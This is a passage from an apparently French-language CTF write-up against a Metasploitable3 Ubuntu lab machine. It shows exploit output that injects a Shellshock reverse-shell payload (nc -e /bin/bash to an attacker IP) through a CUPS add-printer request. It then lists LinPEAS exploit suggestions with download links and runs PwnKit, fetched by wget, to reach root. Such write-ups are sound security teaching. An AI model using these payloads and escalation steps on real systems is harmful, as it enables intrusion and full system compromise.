[*] (VERBOSE) Sending POST request to http://127.0.0.1:6311/admin/
[*] (VERBOSE) POST Data: {'org.cups.sid': 'QxsG081GaJjCy9O9', 'OP': 'add-printer', 'PRINTER_NAME': 'pwned-ybsOG8NX', 'PRINTER_INFO': '', 'PRINTER_LOCATION': '() { :;}; $(nc -e /bin/bash 192.168.1.43 9999) &', 'DEVICE_URI': 'file:///dev/null'}
[*] (VERBOSE) Files: ['PPD_FILE']
[*] (VERBOSE) Response Status: 200
[*] (VERBOSE) Response Headers: {'Date': 'Fri, 06 Jun 2025 07:38:48 GMT', 'Server': 'CUPS/1.5', 'Connection': 'Keep-Alive', 'Keep-Alive': 'timeout=30', 'Content-Language': 'en_US', 'Transfer-Encoding': 'chunked', 'Content-Type': 'text/html;charset=utf-8'}
[+] Printer 'pwned-ybsOG8NX' added successfully.
[*] Printing test page to trigger payload...
[*] (VERBOSE) Adding test page to printer queue for 'pwned-ybsOG8NX'
[*] (VERBOSE) Sending POST request to http://127.0.0.1:6311/printers/pwned-ybsOG8NX
[*] (VERBOSE) POST Data: {'org.cups.sid': 'QxsG081GaJjCy9O9', 'OP': 'print-test-page'}
[*] (VERBOSE) Response Status: 200
[*] (VERBOSE) Response Headers: {'Date': 'Fri, 06 Jun 2025 07:38:48 GMT', 'Server': 'CUPS/1.5', 'Connection': 'Keep-Alive', 'Keep-Alive': 'timeout=30', 'Content-Language': 'en_US', 'Transfer-Encoding': 'chunked', 'Content-Type': 'text/html;charset=utf-8'}
[+] Test page submitted. Payload should have executed (check listener or target).
[*] The payload executes asynchronously. This script does not confirm execution success.
[*] Cleaning up: deleting printer 'pwned-ybsOG8NX'...
[*] (VERBOSE) Deleting printer 'pwned-ybsOG8NX'
[*] (VERBOSE) Sending POST request to http://127.0.0.1:6311/admin/
[*] (VERBOSE) POST Data: {'org.cups.sid': 'QxsG081GaJjCy9O9', 'OP': 'delete-printer', 'printer_name': 'pwned-ybsOG8NX', 'confirm': 'Delete Printer'}
[*] (VERBOSE) Response Status: 200
[*] (VERBOSE) Response Headers: {'Date': 'Fri, 06 Jun 2025 07:38:48 GMT', 'Server': 'CUPS/1.5', 'Connection': 'Keep-Alive', 'Keep-Alive': 'timeout=30', 'Content-Language': 'en_US', 'Transfer-Encoding': 'chunked', 'Content-Type': 'text/html;charset=utf-8'}
[+] Printer 'pwned-ybsOG8NX' deleted successfully.
[*] Exploit attempt finished.
```

J'obtiens alors un shell.

### Exploitation locale

Bien que les scénarios d'exploitation locale ne semblent pas être prévus par ce CTF, le système est tout de même vulnérable à de nombreuses failles populaires (listing obtenu avec LinPEAS) :

```
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
   Exposure: probable
   Tags: [ ubuntu=(14.04|16.04) ]{kernel:4.4.0-62-generic}
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

[+] [CVE-2016-2384] usb-midi

   Details: https://xairy.github.io/blog/2016/cve-2016-2384
   Exposure: probable
   Tags: [ ubuntu=14.04 ],fedora=22
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c
   Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user

[+] [CVE-2015-8660] overlayfs (ovl_setattr)

   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
   Exposure: probable
   Tags: [ ubuntu=(14.04|15.10) ]{kernel:4.2.0-(18|19|20|21|22)-generic}
   Download URL: https://www.exploit-db.com/download/39166
--- snip ---
```

Ici j'utilise PwnKit, un exploit pour Polkit :

```console
$ www-data@metasploitable3-ub1404:/var/www/uploads$ wget http://192.168.1.47/PwnKit-main.zip
--2025-06-05 14:07:38--  http://192.168.1.47/PwnKit-main.zip
Connecting to 192.168.1.47:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 337827 (330K) [application/zip]
Saving to: 'PwnKit-main.zip'

     0K .......... .......... .......... .......... .......... 15% 5.58M 0s
    50K .......... .......... .......... .......... .......... 30% 5.30M 0s
   100K .......... .......... .......... .......... .......... 45% 7.27M 0s
   150K .......... .......... .......... .......... .......... 60% 66.1M 0s
   200K .......... .......... .......... .......... .......... 75% 22.6M 0s
   250K .......... .......... .......... .......... .......... 90% 9.79M 0s
   300K .......... .......... .........                       100% 79.7M=0.03s

2025-06-05 14:07:38 (9.79 MB/s) - 'PwnKit-main.zip' saved [337827/337827]

www-data@metasploitable3-ub1404:/var/www/uploads$ unzip PwnKit-main.zip
Archive:  PwnKit-main.zip
1923ad7b438ae82eaa2162e15a1e1b810712e54e
   creating: PwnKit-main/
  inflating: PwnKit-main/LICENSE     
  inflating: PwnKit-main/Makefile    
  inflating: PwnKit-main/PwnKit      
  inflating: PwnKit-main/PwnKit.c    
  inflating: PwnKit-main/PwnKit.sh   
  inflating: PwnKit-main/PwnKit32    
  inflating: PwnKit-main/README.md   
   creating: PwnKit-main/imgs/
  inflating: PwnKit-main/imgs/exploit.png  
  inflating: PwnKit-main/imgs/oneliner.png  
  inflating: PwnKit-main/imgs/patched.png  
www-data@metasploitable3-ub1404:/var/www/uploads$ cd PwnKit-main
www-data@metasploitable3-ub1404:/var/www/uploads/PwnKit-main$ ./PwnKit
stdin: is not a tty
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```
